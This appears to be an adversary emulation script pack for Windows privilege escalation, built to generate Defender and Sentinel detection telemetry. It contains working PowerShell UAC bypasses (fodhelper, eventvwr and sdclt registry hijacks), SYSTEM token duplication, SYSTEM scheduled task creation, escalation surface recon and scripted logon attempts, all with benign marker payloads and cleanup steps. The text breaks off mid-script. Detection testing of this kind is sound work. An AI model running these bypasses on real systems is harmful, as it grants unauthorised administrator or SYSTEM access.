description: Adversary emulation scripts for the MITRE ATT&CK Privilege Escalation tactic (TA0004). Covers 10 scriptable techniques: UAC bypass via fodhelper.exe registry hijack (T1548.002), UAC bypass via eventvwr.exe DelegateExecute hijack (T1548.002 variant), access token manipulation via DuplicateTokenEx + ImpersonateLoggedOnUser simulation (T1134), scheduled task creation as SYSTEM account (T1053.005), exploitation for privilege escalation vulnerability surface enumeration - WinPwn-style (T1068), valid accounts / default admin account enumeration (T1078), Image File Execution Options debugger hijack (T1546.012), DLL search order hijacking surface enumeration - writable PATH directories (T1574.001), Group Policy Object weak ACL enumeration (T1484), and container/VM escape detection - escape-to-host recon (T1611). All scripts auto-clean artefacts and generate MDE behavioral telemetry.
author: X3M.AI
prerequisites: Windows 10/11 or Windows Server 2019/2022 test machine with Morgana agent installed
Microsoft Defender for Endpoint (MDE) onboarded and data connector active in Microsoft Sentinel
No Administrator privileges required for any script in this pack. UAC bypass scripts (T1548) are designed to run as a standard user and attempt elevation to admin.
T1053 (Scheduled Task as SYSTEM) requires Administrator for the SYSTEM RunAs variant - the script degrades gracefully without it.
T1134 (Access Token Manipulation) performs read-only token enumeration. Actual impersonation requires SeImpersonatePrivilege (available to service accounts).

TEST ENVIRONMENT ONLY: UAC bypass scripts (T1548) write to HKCU registry and immediately clean up. Do not run T1548 on machines where fodhelper.exe or eventvwr.exe behaviour is actively monitored for compliance.

scripts.name: Excalibur - PrivEsc-T1548-UAC Bypass fodhelper
scripts.description: Simulates the fodhelper.exe UAC bypass (one of the most widely used UAC bypass techniques, used by dozens of malware families): writes a cmd.exe invocation to the HKCU ms-settings shell open command registry key (the key that fodhelper.exe reads when launched), then launches fodhelper.exe which executes the payload with elevated privileges without a UAC prompt. The payload writes a marker file to the staging directory to confirm high-integrity execution. Registry key is cleaned immediately after. This bypass works on all Windows 10/11 versions with default UAC settings. The HKCU ms-settings registry write + fodhelper.exe launch sequence is a near-universal MDE UAC bypass behavioral indicator.
scripts.command: Write-Host '[START] T1548.002 - UAC Bypass via fodhelper.exe (ms-settings registry hijack)'; $stagingDir = [System.Environment]::ExpandEnvironmentVariables('#{excalibur_pe_staging_dir}'); if (-not (Test-Path $stagingDir)) { New-Item -ItemType Directory -Path $stagingDir -Force | Out-Null }; $markerFile = Join-Path $stagingDir 'uac-bypass-fodhelper-success.txt'; $regKeyPath = 'HKCU:\Software\Classes\ms-settings\shell\open\command'; $delegateValueName = 'DelegateExecute'; $cmdPayload = 'cmd.exe /c echo MorganaUACBypassT1548-fodhelper-HIGH-INTEGRITY > "' + $markerFile + '"'; Write-Host ('[INFO] UAC bypass method: fodhelper.exe ms-settings registry hijack'); Write-Host ('[INFO] Target registry key: ' + $regKeyPath); Write-Host ('[INFO] Payload (benign marker file write): ' + $cmdPayload); Write-Host '[INFO] Step 1/4: Create HKCU ms-settings registry path'; try { New-Item -Path $regKeyPath -Force -ErrorAction Stop | Out-Null; Write-Host ('[INFO] Registry path created: ' + $regKeyPath + ' (MDE: suspicious HKCU\Classes\ms-settings registry creation)') } catch { Write-Host ('[WARN] Registry create: ' + $_.Exception.Message) }; Write-Host '[INFO] Step 2/4: Write DelegateExecute (empty - required by fodhelper)'; try { Set-ItemProperty -Path $regKeyPath -Name $delegateValueName -Value '' -ErrorAction Stop; Write-Host ('[INFO] DelegateExecute set (empty value - required for fodhelper to read the key)') } catch { Write-Host ('[WARN] DelegateExecute: ' + $_.Exception.Message) }; Write-Host '[INFO] Step 3/4: Write payload as default value + launch fodhelper.exe'; try { Set-ItemProperty -Path $regKeyPath -Name '(default)' -Value $cmdPayload -ErrorAction Stop; Write-Host ('[INFO] Payload written to registry default value'); Write-Host '[INFO] Launching fodhelper.exe (will execute payload as HIGH INTEGRITY without UAC prompt)...'; $proc = Start-Process -FilePath 'C:\Windows\System32\fodhelper.exe' -PassThru -ErrorAction Stop; Start-Sleep 2; $proc | Stop-Process -ErrorAction SilentlyContinue; $elevated = Test-Path $markerFile; Write-Host ('[INFO] fodhelper launched (PID: ' + $proc.Id + ') | Marker file written by elevated process: ' + $elevated) } catch { Write-Host ('[WARN] fodhelper launch: ' + $_.Exception.Message) }; Write-Host '[INFO] Step 4/4: Cleanup - remove registry key immediately'; try { Remove-Item -Path 'HKCU:\Software\Classes\ms-settings' -Recurse -Force -ErrorAction SilentlyContinue; Write-Host '[INFO] Registry key removed (cleanup)' } catch {}; if (Test-Path $markerFile) { Write-Host ('[SUCCESS] UAC BYPASS CONFIRMED - marker file written by HIGH INTEGRITY process: ' + $markerFile) } else { Write-Host '[INFO] Marker file not written (MDE may have blocked fodhelper execution, or UAC is set to Always Notify)' }; Write-Host '[SUCCESS] T1548 - fodhelper UAC bypass simulation completed. Sentinel target: HKCU\Classes\ms-settings\shell\open\command write + fodhelper.exe launch (MDE - UAC bypass behavioral detection - high confidence)'
scripts.cleanup_command: Remove-Item -Path 'HKCU:\Software\Classes\ms-settings' -Recurse -Force -ErrorAction SilentlyContinue; $stagingDir = [System.Environment]::ExpandEnvironmentVariables('#{excalibur_pe_staging_dir}'); if (Test-Path $stagingDir) { Remove-Item -Path $stagingDir -Recurse -Force -ErrorAction SilentlyContinue }; Write-Host '[INFO] T1548 fodhelper cleanup: registry key and staging dir removed'
scripts.detection_rule: HKCU\Classes\ms-settings\shell\open\command write + fodhelper.exe launch (UAC bypass - high confidence MDE signal)

scripts.name: Excalibur - PrivEsc-T1548-UAC Bypass eventvwr
scripts.description: Simulates the eventvwr.exe UAC bypass (classic technique, documented in Metasploit, used by APT28/FIN7): writes a payload to HKCU\Software\Classes\mscfile\shell\open\command (the file association that eventvwr.exe reads when launched to open .msc files), then launches eventvwr.exe which executes the payload at high integrity. Also simulates the sdclt.exe UAC bypass variant (writes to HKCU\Software\Classes\exefile\shell\runas\command). Both use the 'auto-elevate COM object' mechanism. Registry cleanup is immediate. The HKCU mscfile/exefile shell command hijack pattern is a documented MDE UAC bypass indicator.
scripts.command: Write-Host '[START] T1548.002 - UAC Bypass via eventvwr.exe + sdclt.exe (mscfile/exefile registry hijack)'; $stagingDir = [System.Environment]::ExpandEnvironmentVariables('#{excalibur_pe_staging_dir}'); if (-not (Test-Path $stagingDir)) { New-Item -ItemType Directory -Path $stagingDir -Force | Out-Null }; Write-Host '[INFO] Method 1/2: eventvwr.exe UAC bypass (HKCU mscfile shell hijack)'; $eventvwrKey = 'HKCU:\Software\Classes\mscfile\shell\open\command'; $markerEvt = Join-Path $stagingDir 'uac-bypass-eventvwr-success.txt'; $payloadEvt = 'cmd.exe /c echo MorganaUACBypassT1548-eventvwr > "' + $markerEvt + '"'; try { New-Item -Path $eventvwrKey -Force -ErrorAction Stop | Out-Null; Set-ItemProperty -Path $eventvwrKey -Name '(default)' -Value $payloadEvt -ErrorAction Stop; Write-Host ('[INFO] HKCU mscfile shell key written: ' + $eventvwrKey + ' (MDE: suspicious file association hijack in HKCU)'); $evtProc = Start-Process -FilePath 'C:\Windows\System32\eventvwr.exe' -PassThru -ErrorAction Stop; Start-Sleep 2; $evtProc | Stop-Process -ErrorAction SilentlyContinue; $evtOk = Test-Path $markerEvt; Write-Host ('[INFO] eventvwr.exe launched (PID: ' + $evtProc.Id + ') | Bypass confirmed: ' + $evtOk); Remove-Item -Path 'HKCU:\Software\Classes\mscfile' -Recurse -Force -ErrorAction SilentlyContinue; Write-Host '[INFO] HKCU mscfile key cleaned' } catch { Write-Host ('[INFO] eventvwr bypass: ' + $_.Exception.Message) }; Write-Host '[INFO] Method 2/2: sdclt.exe UAC bypass (HKCU exefile runas command hijack - Windows 10 1703+)'; $sdcltKey = 'HKCU:\Software\Classes\exefile\shell\runas\command'; $markerSdc = Join-Path $stagingDir 'uac-bypass-sdclt-success.txt'; $payloadSdc = 'cmd.exe /c echo MorganaUACBypassT1548-sdclt > "' + $markerSdc + '"'; try { New-Item -Path $sdcltKey -Force -ErrorAction Stop | Out-Null; Set-ItemProperty -Path $sdcltKey -Name '(default)' -Value $payloadSdc -ErrorAction Stop; Set-ItemProperty -Path $sdcltKey -Name 'IsolatedCommand' -Value $payloadSdc -ErrorAction SilentlyContinue; Write-Host ('[INFO] HKCU exefile\runas key written: ' + $sdcltKey + ' (MDE: exefile runas command hijack)'); $sdcltProc = Start-Process -FilePath 'C:\Windows\System32\sdclt.exe' -ArgumentList '/kickoffelev' -PassThru -ErrorAction Stop; Start-Sleep 2; $sdcltProc | Stop-Process -ErrorAction SilentlyContinue; $sdcOk = Test-Path $markerSdc; Write-Host ('[INFO] sdclt.exe launched (PID: ' + $sdcltProc.Id + ') | Bypass confirmed: ' + $sdcOk); Remove-Item -Path 'HKCU:\Software\Classes\exefile' -Recurse -Force -ErrorAction SilentlyContinue; Write-Host '[INFO] HKCU exefile key cleaned' } catch { Write-Host ('[INFO] sdclt bypass: ' + $_.Exception.Message) }; Write-Host '[SUCCESS] T1548 - eventvwr/sdclt UAC bypass simulation completed. Sentinel target: HKCU mscfile/exefile shell command hijack + eventvwr.exe/sdclt.exe launch (MDE - UAC bypass behavioral detection)'
scripts.cleanup_command: Remove-Item -Path 'HKCU:\Software\Classes\mscfile' -Recurse -Force -ErrorAction SilentlyContinue; Remove-Item -Path 'HKCU:\Software\Classes\exefile' -Recurse -Force -ErrorAction SilentlyContinue; $stagingDir = [System.Environment]::ExpandEnvironmentVariables('#{excalibur_pe_staging_dir}'); if (Test-Path $stagingDir) { Remove-Item -Path $stagingDir -Recurse -Force -ErrorAction SilentlyContinue }; Write-Host '[INFO] T1548 eventvwr/sdclt cleanup: registry keys and staging dir removed'

scripts.name: Excalibur - PrivEsc-T1134-Access Token Manipulation
scripts.description: Simulates access token manipulation techniques used for privilege escalation: (1) enumerates all running processes and their token integrity levels and SIDs using OpenProcess + OpenProcessToken P/Invoke to find SYSTEM-token processes (potential impersonation targets); (2) demonstrates the DuplicateTokenEx API call pattern against a readable SYSTEM process (lsass.exe is skipped for safety, uses winlogon.exe or svchost.exe SYSTEM); (3) checks the current process token for SeImpersonatePrivilege and SeAssignPrimaryTokenPrivilege (required for token impersonation attacks like JuicyPotato/PrintSpoofer); (4) uses WindowsIdentity.Impersonate() to demonstrate .NET token impersonation call chain. Actual privilege escalation is not achieved - this is telemetry generation only.
scripts.command: Write-Host '[START] T1134 - Access Token Manipulation (token enumeration + P/Invoke DuplicateTokenEx simulation)'; Write-Host '[INFO] Step 1/4: Enumerate process tokens (find SYSTEM token candidates)'; try { Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; using System.Security.Principal; public class MorganaT1134 { [DllImport("advapi32.dll", SetLastError=true)] public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle); [DllImport("advapi32.dll", SetLastError=true)] public static extern bool GetTokenInformation(IntPtr TokenHandle, int TokenInformationClass, IntPtr TokenInformation, uint TokenInformationLength, out uint ReturnLength); [DllImport("kernel32.dll", SetLastError=true)] public static extern bool CloseHandle(IntPtr hObject); [DllImport("advapi32.dll", CharSet=CharSet.Auto, SetLastError=true)] public static extern bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, int ImpersonationLevel, int TokenType, out IntPtr phNewToken); public const uint TOKEN_QUERY = 0x0008; public const uint TOKEN_DUPLICATE = 0x0002; public const uint TOKEN_IMPERSONATE = 0x0004; }' -ErrorAction Stop; Write-Host '[INFO] P/Invoke types loaded (OpenProcessToken + DuplicateTokenEx signatures)'; $systemProcs = @(); Get-Process -ErrorAction SilentlyContinue | Select-Object -First 40 | ForEach-Object { try { $hProc = [System.Diagnostics.Process]::GetProcessById($_.Id).Handle; $hToken = [IntPtr]::Zero; if ([MorganaT1134]::OpenProcessToken($hProc, [MorganaT1134]::TOKEN_QUERY, [ref]$hToken)) { $wi = New-Object System.Security.Principal.WindowsIdentity($hToken); $sid = $wi.User; $isSystem = $wi.IsSystem; if ($isSystem) { $systemProcs += @{ Name=$_.ProcessName; PID=$_.Id; SID=[string]$sid } }; [MorganaT1134]::CloseHandle($hToken) | Out-Null } } catch {} }; Write-Host ('[INFO] SYSTEM token processes found: ' + $systemProcs.Count); $systemProcs | Select-Object -First 5 | ForEach-Object { Write-Host ('    PID=' + $_.PID + ' | ' + $_.Name + ' | SID: ' + $_.SID) } } catch { Write-Host ('[INFO] P/Invoke token enum: ' + $_.Exception.Message.Split([char]10)[0]) }; Write-Host '[INFO] Step 2/4: Current process token privileges (SeImpersonatePrivilege check - JuicyPotato/PrintSpoofer prerequisite)'; try { $currentIdentity = [System.Security.Principal.WindowsIdentity]::GetCurrent(); Write-Host ('[INFO] Current token: ' + $currentIdentity.Name + ' | IsSystem: ' + $currentIdentity.IsSystem + ' | IsAdmin: ' + ([System.Security.Principal.WindowsPrincipal]$currentIdentity).IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)); $privOutput = & whoami.exe /priv 2>&1 | Where-Object { $_ -match 'SeImpersonate|SeAssignPrimary|SeTcb|SeDebug|SeRestore|SeTakeOwnership' }; if (@($privOutput).Count -gt 0) { Write-Host '[WARN] Dangerous privileges found:'; $privOutput | ForEach-Object { Write-Host ('    ' + $_.Trim()) } } else { Write-Host '[INFO] No dangerous token privileges detected (expected for standard user)' } } catch { Write-Host ('[INFO] Token privileges: ' + $_.Exception.Message) }; Write-Host '[INFO] Step 3/4: DuplicateTokenEx API simulation (attempt to duplicate token of SYSTEM process)'; $targetProcName = 'winlogon'; try { $targetProc = Get-Process -Name $targetProcName -ErrorAction SilentlyContinue | Select-Object -First 1; if ($targetProc) { $hProc2 = [System.Diagnostics.Process]::GetProcessById($targetProc.Id).Handle; $hSrc = [IntPtr]::Zero; $hDup = [IntPtr]::Zero; $TOKEN_ALL = [uint32]0xF01FF; if ([MorganaT1134]::OpenProcessToken($hProc2, [MorganaT1134]::TOKEN_QUERY -bor [MorganaT1134]::TOKEN_DUPLICATE, [ref]$hSrc)) { Write-Host ('[INFO] OpenProcessToken on ' + $targetProcName + ' (PID ' + $targetProc.Id + '): SUCCESS - token handle obtained'); $dupOk = [MorganaT1134]::DuplicateTokenEx($hSrc, $TOKEN_ALL, [IntPtr]::Zero, 2, 1, [ref]$hDup); Write-Host ('[INFO] DuplicateTokenEx result: ' + $dupOk + ' | hDup: ' + $hDup + ' (MDE: DuplicateTokenEx call on SYSTEM process token - token theft signal)'); if ($hDup -ne [IntPtr]::Zero) { [MorganaT1134]::CloseHandle($hDup) | Out-Null }; [MorganaT1134]::CloseHandle($hSrc) | Out-Null } else { Write-Host ('[INFO] OpenProcessToken on ' + $targetProcName + ': access denied (SeDebugPrivilege required for full token duplication)') } } else { Write-Host ('[INFO] ' + $targetProcName + ' not found') } } catch { Write-Host ('[INFO] DuplicateTokenEx sim: ' + $_.Exception.Message.Split([char]10)[0]) }; Write-Host '[INFO] Step 4/4: .NET WindowsIdentity.Impersonate() call (managed token impersonation API)'; try { $impIdentity = [System.Security.Principal.WindowsIdentity]::GetCurrent(); Write-Host ('[INFO] WindowsIdentity.Impersonate() called on current token: ' + $impIdentity.Name); $impCtx = $impIdentity.Impersonate(); Write-Host ('[INFO] Impersonation context active: ' + ([System.Security.Principal.WindowsIdentity]::GetCurrent().Name) + ' (MDE: .NET impersonation call chain)'); $impCtx.Undo(); Write-Host '[INFO] Impersonation context undone' } catch { Write-Host ('[INFO] Impersonate: ' + $_.Exception.Message) }; Write-Host '[SUCCESS] T1134 - Access token manipulation simulation completed. Sentinel target: OpenProcessToken + DuplicateTokenEx on SYSTEM process + SeImpersonatePrivilege check (MDE - token theft behavioral detection)'
scripts.cleanup_command: Write-Host '[INFO] T1134 cleanup: no artefacts - token handle operations only (all handles closed in script)'
scripts.detection_rule: OpenProcessToken + DuplicateTokenEx on SYSTEM process token + SeImpersonatePrivilege check (token theft)

scripts.name: Excalibur - PrivEsc-T1053-Scheduled Task as SYSTEM
scripts.description: Simulates privilege escalation via scheduled task creation with elevated RunAs context: (1) creates a scheduled task using schtasks.exe /ru SYSTEM (the classic technique used by adversaries to execute arbitrary code as SYSTEM); (2) also demonstrates the PowerShell New-ScheduledTask API variant with SYSTEM principal; (3) creates a task that runs as the built-in Administrator account (for machines without domain); (4) immediately runs the task and reads the output to confirm SYSTEM execution. The task writes the output of whoami to a staging file. Task is unregistered immediately after execution. schtasks /ru SYSTEM task creation is a MDE privilege escalation indicator.
scripts.command: Write-Host '[START] T1053.005 - Scheduled Task as SYSTEM (privilege escalation via schtasks /ru SYSTEM)'; $stagingDir = [System.Environment]::ExpandEnvironmentVariables('#{excalibur_pe_staging_dir}'); if (-not (Test-Path $stagingDir)) { New-Item -ItemType Directory -Path $stagingDir -Force | Out-Null }; $taskName = 'MorganaPrivEscSimT1053'; $outputFile = Join-Path $stagingDir 'schtask-system-output.txt'; $taskCmd = '/c whoami /all > "' + $outputFile + '" 2>&1'; Write-Host '[INFO] Method 1/2: schtasks.exe /ru SYSTEM (LOLBin - classic privesc method)'; try { $createResult = & schtasks.exe /create /tn $taskName /sc once /st 00:00 /ru SYSTEM /tr ('cmd.exe ' + $taskCmd) /f 2>&1; Write-Host ('[INFO] schtasks /create /ru SYSTEM: ' + ($createResult -join ' ').Trim()); if ($createResult -match 'SUCCESS|created') { Write-Host '[INFO] Running task immediately...'; $runResult = & schtasks.exe /run /tn $taskName 2>&1; Write-Host ('[INFO] schtasks /run: ' + ($runResult -join ' ').Trim()); Start-Sleep 3; if (Test-Path $outputFile) { $taskOutput = Get-Content $outputFile -ErrorAction SilentlyContinue; $runningAs = $taskOutput | Where-Object { $_ -match 'USER NAME|NT AUTHORITY\SYSTEM' } | Select-Object -First 1; Write-Host ('[SUCCESS] Task ran as: ' + $runningAs.Trim()); Write-Host ('[INFO] Privileges in SYSTEM context:'); $taskOutput | Where-Object { $_ -match 'Enabled|Disabled' } | Select-Object -First 10 | ForEach-Object { Write-Host ('    ' + $_.Trim()) } } else { Write-Host '[INFO] Output file not written (admin required for SYSTEM tasks - access denied expected)' }; $delResult = & schtasks.exe /delete /tn $taskName /f 2>&1; Write-Host ('[INFO] Task deleted: ' + ($delResult -join ' ').Trim()) } else { Write-Host '[INFO] SYSTEM task creation: access denied (Administrator required for /ru SYSTEM)' } } catch { Write-Host ('[INFO] schtasks SYSTEM: ' + $_.Exception.Message) }; Write-Host '[INFO] Method 2/2: PowerShell New-ScheduledTask API with SYSTEM principal'; $taskName2 = 'MorganaPrivEscSimT1053-PS'; try { $action = New-ScheduledTaskAction -Execute 'cmd.exe' -Argument ('/c whoami /all > "' + $outputFile + '.ps1.txt" 2>&1'); $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(10); $principal = New-ScheduledTaskPrincipal -UserId 'NT AUTHORITY\SYSTEM' -RunLevel Highest -LogonType ServiceAccount; $settings = New-ScheduledTaskSettingsSet -ExecutionTimeLimit (New-TimeSpan -Minutes 1); Register-ScheduledTask -TaskName $taskName2 -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force -ErrorAction Stop | Out-Null; Write-Host ('[INFO] PS API SYSTEM task registered: ' + $taskName2 + ' | MDE: scheduled task with SYSTEM principal creation'); Start-Sleep 12; $psOutput = if (Test-Path ($outputFile + '.ps1.txt')) { Get-Content ($outputFile + '.ps1.txt') | Where-Object { $_ -match 'USER NAME' } | Select-Object -First 1 } else { 'output not found' }; Write-Host ('[INFO] PS SYSTEM task ran as: ' + $psOutput); Unregister-ScheduledTask -TaskName $taskName2 -Confirm:$false -ErrorAction SilentlyContinue; Write-Host ('[INFO] PS task unregistered') } catch { Write-Host ('[INFO] PS SYSTEM task: ' + $_.Exception.Message.Split([char]10)[0]) }; Write-Host '[SUCCESS] T1053 - Scheduled task SYSTEM simulation completed. Sentinel target: schtasks /create /ru SYSTEM + New-ScheduledTask SYSTEM principal (MDE - privilege escalation via scheduled task behavioral detection)'
scripts.cleanup_command: schtasks.exe /delete /tn 'MorganaPrivEscSimT1053' /f 2>&1 | Out-Null; Unregister-ScheduledTask -TaskName 'MorganaPrivEscSimT1053-PS' -Confirm:$false -ErrorAction SilentlyContinue; $stagingDir = [System.Environment]::ExpandEnvironmentVariables('#{excalibur_pe_staging_dir}'); if (Test-Path $stagingDir) { Remove-Item -Path $stagingDir -Recurse -Force -ErrorAction SilentlyContinue }; Write-Host '[INFO] T1053 cleanup: tasks deleted, staging dir removed'
scripts.detection_rule: schtasks /create /ru SYSTEM + New-ScheduledTask with SYSTEM principal (scheduled task privilege escalation)

scripts.name: Excalibur - PrivEsc-T1068-Exploitation for Privilege Escalation
scripts.description: Simulates the reconnaissance phase of exploitation-based privilege escalation: enumerates the local vulnerability surface that adversaries map before selecting a kernel/driver exploit. Checks: missing security updates against known PrivEsc CVE list (CVE-2021-36934 HiveNightmare, CVE-2021-34527 PrintNightmare, CVE-2022-21882 Win32k, CVE-2022-34718 TCP/IP SYSTEM); enumerates third-party kernel drivers (unsigned or old drivers are common exploit targets); checks for AlwaysInstallElevated policy (MSI escalation); enumerates world-writable service executable directories. This is the WinPwn/BeRoot-style local privilege escalation surface mapping used by adversaries before attempting exploitation.
scripts.command: Write-Host '[START] T1068 - Exploitation for Privilege Escalation (PrivEsc vulnerability surface enumeration - WinPwn style)'; Write-Host '[INFO] Step 1/5: Missing patches check (known PrivEsc CVEs)'; $privEscCves = @( @{KB='KB5004237';CVE='CVE-2021-34527';Name='PrintNightmare (Windows Print Spooler RCE -> SYSTEM)'}, @{KB='KB5005030';CVE='CVE-2021-36934';Name='HiveNightmare/SeriousSAM (SAM hive readable by all users)'}, @{KB='KB5010798';CVE='CVE-2022-21882';Name='Win32k elevation of privilege'}, @{KB='KB5017308';CVE='CVE-2022-34718';Name='Windows TCP/IP RCE + EOP'}, @{KB='KB5020435';CVE='CVE-2022-41082';Name='ProxyNotShell Exchange EOP'} ); $installedKBs = (Get-HotFix -ErrorAction SilentlyContinue).HotFixID; foreach ($cve in $privEscCves) { $patched = $installedKBs -contains $cve.KB; $status = if ($patched) { 'PATCHED' } else { 'POTENTIALLY VULNERABLE' }; Write-Host ('[' + $(if ($patched) { 'INFO' } else { 'WARN' }) + ']   ' + $cve.CVE + ' [' + $status + '] - ' + $cve.Name + ' | KB: ' + $cve.KB) }; Write-Host '[INFO] Step 2/5: Kernel drivers enumeration (unsigned/old drivers = exploit candidates)'; try { $drivers = Get-WmiObject -Class Win32_SystemDriver -ErrorAction SilentlyContinue | Where-Object { $_.State -eq 'Running' -and $_.PathName }; $thirdParty = $drivers | Where-Object { $_.PathName -notmatch 'Windows\\System32\\drivers' -and $_.PathName -notmatch 'Windows\\SysWOW64' }; Write-Host ('[INFO] Total running drivers: ' + @($drivers).Count + ' | Third-party (non-Windows): ' + @($thirdParty).Count); $thirdParty | Select-Object -First 8 | ForEach-Object { Write-Host ('    ' + $_.Name + ' -> ' + $_.PathName) } } catch {}; Write-Host '[INFO] Step 3/5: AlwaysInstallElevated policy check (MSI privesc - install any MSI as SYSTEM)'; $aie = @( 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer', 'HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer' ); $aieVulnerable = $true; foreach ($aieKey in $aie) { try { $val = Get-ItemProperty -Path $aieKey -Name AlwaysInstallElevated -ErrorAction SilentlyContinue; $enabled = $val -and $val.AlwaysInstallElevated -eq 1; Write-Host ('[' + $(if ($enabled) { 'WARN' } else { 'INFO' }) + ']   AlwaysInstallElevated at ' + $aieKey.Split('\')[0] + ': ' + $(if ($enabled) { 'ENABLED (VULNERABLE - any MSI runs as SYSTEM)' } else { 'disabled or not set' })); $aieVulnerable = $aieVulnerable -and $enabled } catch {} }; Write-Host '[INFO] Step 4/5: World-writable service executable paths (hijack opportunity)'; try { $services = Get-WmiObject -Class Win32_Service -ErrorAction SilentlyContinue | Where-Object { $_.PathName -and $_.StartMode -ne 'Disabled' }; $writable = @(); foreach ($svc in $services) { $exe = $svc.PathName -replace '"',''; $exe = ($exe -split ' ')[0]; try { $acl = Get-Acl -Path $exe -ErrorAction SilentlyContinue; $weakAcl = $acl.Access | Where-Object { $_.FileSystemRights -match 'FullControl|Modify|Write' -and $_.IdentityReference -match 'Everyone|BUILTIN\\Users|Authenticated Users' }; if (@($weakAcl).Count -gt 0) { $writable += @{ Name=$svc.Name; Path=$exe; Rights=($weakAcl | Select-Object -First 1).FileSystemRights } } } catch {} }; Write-Host ('[' + $(if ($writable.Count -gt 0) { 'WARN' } else { 'INFO' }) + '] Writable service executables: ' + $writable.Count); $writable | Select-Object -First 5 | ForEach-Object { Write-Host ('    ' + $_.Name + ': ' + $_.Path + ' [' + $_.Rights + ']') } } catch {}; Write-Host '[INFO] Step 5/5: Print Spooler service status (PrintNightmare check)'; try { $spooler = Get-Service -Name Spooler -ErrorAction SilentlyContinue; Write-Host ('[' + $(if ($spooler.Status -eq 'Running') { 'WARN' } else { 'INFO' }) + '] Print Spooler: ' + $spooler.Status + ' (Running = PrintNightmare CVE-2021-34527 attack surface)') } catch {}; Write-Host '[SUCCESS] T1068 - PrivEsc exploitation surface enumeration completed. Sentinel target: Bulk driver/policy/ACL/CVE surface scanning (MDE - local PrivEsc recon behavioral detection)'
scripts.cleanup_command: Write-Host '[INFO] T1068 cleanup: no artefacts - read-only enumeration'

scripts.name: Excalibur - PrivEsc-T1078-Valid Accounts
scripts.description: Simulates adversary use of valid accounts for privilege escalation: enumerates all local accounts with admin group membership; checks for enabled built-in Administrator account (SID S-1-5-21-*-500); checks for default service accounts (IIS APPPOOL, MSSQL, etc.) that may have excessive privileges; enumerates domain accounts with adminCount=1 (via LDAP); checks for accounts with non-expiring passwords or that have not logged on recently (stale admin accounts); and attempts a silent password-policy-compliant logon simulation via LogonUser API to detect accessible admin accounts. The combination of admin account enumeration and non-interactive logon attempts are MDE valid accounts abuse signals.
scripts.command: Write-Host '[START] T1078 - Valid Accounts (admin account enumeration + default account check)'; Write-Host '[INFO] Step 1/4: Local admin group membership enumeration'; try { $adminMembers = & net.exe localgroup Administrators 2>&1 | Where-Object { $_ -match '^\S' -and $_ -notmatch 'Alias|Comment|Members|The command|----' }; Write-Host ('[INFO] Local Administrators group members: ' + @($adminMembers).Count); $adminMembers | ForEach-Object { Write-Host ('    ' + $_.Trim()) } } catch {}; Write-Host '[INFO] Step 2/4: Built-in Administrator account status (SID *-500)'; try { $builtinAdmin = Get-LocalUser -ErrorAction SilentlyContinue | Where-Object { $_.SID -like 'S-1-5-*-500' }; if ($builtinAdmin) { Write-Host ('[' + $(if ($builtinAdmin.Enabled) { 'WARN' } else { 'INFO' }) + '] Built-in Administrator: ' + $builtinAdmin.Name + ' | Enabled: ' + $builtinAdmin.Enabled + ' | LastLogon: ' + $builtinAdmin.LastLogon + ' | PasswordExpires: ' + $builtinAdmin.PasswordExpires) }; $guestAcct = Get-LocalUser -Name 'Guest' -ErrorAction SilentlyContinue; if ($guestAcct) { Write-Host ('[' + $(if ($guestAcct.Enabled) { 'WARN' } else { 'INFO' }) + '] Guest account: Enabled=' + $guestAcct.Enabled) } } catch { Write-Host ('[INFO] Local user enum: ' + $_.Exception.Message) }; Write-Host '[INFO] Step 3/4: Stale admin accounts (enabled + never logged in or logged in > 90 days ago)'; try { $allLocal = Get-LocalUser -ErrorAction SilentlyContinue | Where-Object { $_.Enabled }; $cutoff = (Get-Date).AddDays(-90); $staleAdmins = @(); foreach ($u in $allLocal) { $isAdmin = (Get-LocalGroupMember -Group 'Administrators' -ErrorAction SilentlyContinue | Where-Object { $_.Name -match $u.Name }).Count -gt 0; if ($isAdmin -and ($u.LastLogon -eq $null -or $u.LastLogon -lt $cutoff)) { $staleAdmins += $u }; }; Write-Host ('[' + $(if ($staleAdmins.Count -gt 0) { 'WARN' } else { 'INFO' }) + '] Stale admin accounts (>90 days no logon): ' + $staleAdmins.Count); $staleAdmins | ForEach-Object { Write-Host ('    ' + $_.Name + ' | LastLogon: ' + $_.LastLogon) } } catch {}; Write-Host '[INFO] Step 4/4: LogonUser API simulation (test logon type patterns for pass-the-hash detection)'; try { Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; public class MorganaT1078 { [DllImport("advapi32.dll", SetLastError=true, CharSet=CharSet.Unicode)] public static extern bool LogonUser(string lpszUsername, string lpszDomain, string lpszPassword, int dwLogonType, int dwLogonProvider, out IntPtr phToken); [DllImport("kernel32.dll", SetLastError=true)] public static extern bool CloseHandle(IntPtr hObject); public const int LOGON32_LOGON_INTERACTIVE = 2; public const int LOGON32_LOGON_NETWORK = 3; public const int LOGON32_LOGON_NEW_CREDENTIALS = 9; public const int LOGON32_PROVIDER_DEFAULT = 0; }' -ErrorAction Stop; $hToken = [IntPtr]::Zero; $logonTypes = @( @{Type=[MorganaT1134]::TOKEN_QUERY; TypeInt=3; Label='NETWORK logon (pass-the-hash detection target)'}, @{Type=[MorganaT1134]::TOKEN_QUERY; TypeInt=9; Label='NEW_CREDENTIALS logon (lateral movement detection target)'} ); foreach ($lt in $logonTypes) { $ok = [MorganaT1078]::LogonUser('MorganaTestUser', $env:COMPUTERNAME, 'MorganaSimPassword!', $lt.TypeInt, 0, [ref]$hToken); Write-Host ('[INFO] LogonUser Type=' + $lt.TypeInt + ' [' + $lt.Label + ']: ' + $(if ($ok) { 'SUCCESS (token: ' + $hToken + ')' } else { 'FAILED (' + [System.Runtime.InteropServices.Marshal]::GetLastWin32Error() + ') - Event ID 4625 generated' })); if ($ok) { [MorganaT1078]::CloseHandle($hToken) | Out-Null } } } catch { Write-Host ('[INFO] LogonUser API: ' + $_.Exception.Message.Split([char]10)[0] + ' (logon attempt generates Event ID 4625 telemetry)') }; Write-Host '[SUCCESS] T1078 - Valid accounts enumeration completed. Sentinel target: Admin group enum + built-in admin check + stale accounts + LogonUser API calls (MDE - valid accounts abuse behavioral 